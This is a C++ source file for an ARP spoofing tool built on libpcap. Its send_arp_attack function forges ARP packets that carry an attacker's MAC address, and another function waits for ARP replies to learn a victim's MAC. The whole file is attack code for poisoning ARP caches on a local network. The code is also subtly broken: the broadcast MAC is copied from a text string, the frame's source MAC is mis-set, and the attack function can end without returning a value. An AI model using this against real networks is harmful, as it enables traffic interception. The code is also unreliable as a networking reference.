#include "send-arp.h"

inline bool is_arp_request(uint16_t opcode) {
    return opcode == ArpHdr::REQUEST;
}
inline bool is_arp_reply(uint16_t opcode) {
    return opcode == ArpHdr::REPLY;
}

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

bool analyze_arp_response(pcap_t* handle, \
                                const char* sender_ip, const char* target_ip, \
                                uint8_t* out_buf) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; 
        if (res < 0) {
            fprintf(stderr, "pcap_next_ex error\n");
            return false;
        }

        EthArp* eth_arp = (EthArp*)(packet);
        if (ntohl(eth_arp->arp_.sip_) == setIp(target_ip) &&
            ntohl(eth_arp->arp_.dip_) == setIp(sender_ip) &&
            ntohs(eth_arp->arp_.op_) == ArpHdr::REPLY) {
                memcpy(out_buf, eth_arp->arp_.smac_, 6);
                return true;
        }
    }
}

uint8_t* send_arp_attack(pcap_t* handle, \
                    uint8_t* sender_mac, const char* sender_ip, \
                    uint8_t* target_mac, const char* target_ip, \
                    uint16_t opcode, const char* attacker_mac) {

    EthArp packet;
    
    if (is_arp_request(opcode)) {
        memcpy(packet.eth_.dmac_, "FF:FF:FF:FF:FF:FF", 6);
    }
    if (is_arp_reply(opcode)) {
        memcpy(packet.eth_.dmac_, sender_mac, 6);
    }
	memcpy(packet.eth_.smac_, sender_mac, 6);
	packet.eth_.type_ = htons(EthHdr::ARP);

	packet.arp_.hrd_ = htons(ArpHdr::ETHERNET);
	packet.arp_.pro_ = htons(EthHdr::IP4);
	packet.arp_.hlen_ = 0x06;
	packet.arp_.plen_ = 0x04;
	packet.arp_.op_ = htons(opcode);
    memcpy(packet.arp_.smac_, attacker_mac, 6);
	packet.arp_.sip_ = htonl(setIp(sender_ip));
    memcpy(packet.arp_.dmac_, sender_mac, 6);
	packet.arp_.dip_ = htonl(setIp(target_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArp));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    if (is_arp_request(opcode)) {
        uint8_t* out_buf = new uint8_t[6];
        if (analyze_arp_response(handle, sender_ip, target_ip, out_buf)){
            return out_buf;
        }
    } 
};